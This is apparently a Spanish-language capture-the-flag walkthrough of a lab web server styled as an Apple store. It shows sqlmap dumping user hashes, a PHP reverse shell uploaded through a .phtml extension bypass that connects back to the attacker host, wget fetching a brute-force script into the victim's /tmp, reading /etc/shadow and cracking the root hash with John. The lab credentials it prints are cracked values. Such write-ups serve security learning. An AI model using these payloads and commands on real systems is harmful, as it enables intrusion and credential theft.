## Reconocimiento:

Puerto 80 : HTTP

En la web hay una página tipo Apple Store con opción de registro. Me creo una cuenta y dentro hay una opción de carrito de compras y una barra de búsquedas que interesa.

Le voy a aplicar una inyección SQL a la barra de búsquedas interceptando la petición con BurpSuite y agregándola a un archivo llamado “request.txt”:

```bash
sqlmap -r request.txt --dbs --batch
```

Encuentro la tabla “apple_store”

```bash
sqlmap -r request.txt --dbs --batch -D apple_store --threads 10 --tables
```

Tiene 3 columnas: id, password y users:

```bash
sqlmap -r request.txt --dbs --batch -D apple_store -T users --threads 10 --dump
# Info:
761bb015d7254610f89d9a7b6b152f1df2027e0a : luisillo
7f73ae7a9823a66efcddd10445804f7d124cd8b0 : admin
```

Parecen contraseñas hasheadas, usando CrackStation identifico que son hashes tipo sha1 y el contenido es:

```bash
luisillo:mundodecaramelo
admin:0844575632
```

Logeandome en la web como admin hay un panel de administración, que tiene una opción de subir archivo en la parte de configuración. Teniendo en cuenta eso y con un fuzzeo de directorios, compruebo que hay un directorio llamado “uploads” y el vector de ataque sería una conexión reversa.

Intento subir una php pero no deja, intento bypassear con una phtml y funciona:

```bash
<?php
$sock=fsockopen("172.17.0.1",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Me pongo en escucha:

```bash
nc -nlvp 4444
```

Y ejecuto en el navegador:

```bash
http://172.17.0.2/uploads/shell.phtml
```

## Escalada www-data → luisillo

Probando la contraseña que había encontrado para este usuario no funciona, así que me paso el archivo para hacer fuerza bruta a la maquina victima:

Desde el host creo un servidor con python:

```bash
python3 -m http.server
```

Luego los traigo al directorio /tmp de la maquina víctima:

```bash
wget http://172.17.0.1:8000/suBruteforce.sh
wget http://172.17.0.1:8000/rockyou.txt
```

y ejecuto:

```bash
bash suBruteforce.sh luisillo_o rockyou.txt
# Info:
[+] Contraseña encontrada para el usuario luisillo_o:19831983
```

## Escalada luisillo → root

Explorando el servidor me doy cuenta que puedo leer el archivo /etc/shadow:

```bash
cat /etc/shadow
```

Contiene un hash con la contraseña encriptada de root:

```bash
root:$y$j9T$awXWvi2tYABgO5kreZcIi/$obvQc0Amd6lFWbwfElQhZD6vpJN/AEV8/hZMXLYTx07:19969:0:99999:7:::
```

Utilizo John para crackearlo:

```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Encuentro la contraseña: “rainbow2”

Listo
